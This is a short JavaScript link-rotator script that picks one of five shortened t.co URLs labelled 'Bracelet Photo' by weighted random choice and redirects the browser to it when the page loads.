// List of URLs with their respective weights
const urlWeights = [

  
    // Bracelet Photo
    { url: "https://t.co/rYYGntj8rR", weight: 1 },
    { url: "https://t.co/hCcf3CU8Xg", weight: 1 },
    { url: "https://t.co/XXZbpiyfkB", weight: 1 },
    { url: "https://t.co/rLoYiiECry", weight: 1 },
    { url: "https://t.co/kLWKy4xnET", weight: 1 },

  
    
    


    
];

// Function to get a random URL based on weights
function getWeightedRandomUrl() {
    // Calculate the total weight
    const totalWeight = urlWeights.reduce((sum, item) => sum + item.weight, 0);

    // Get a random number between 0 and totalWeight
    let randomNum = Math.random() * totalWeight;

    // Select the URL based on the random number
    for (const item of urlWeights) {
        if (randomNum < item.weight) {
            return item.url;
        }
        randomNum -= item.weight;
    }
}

// Redirect to the weighted random URL
window.location.href = getWeightedRandomUrl();
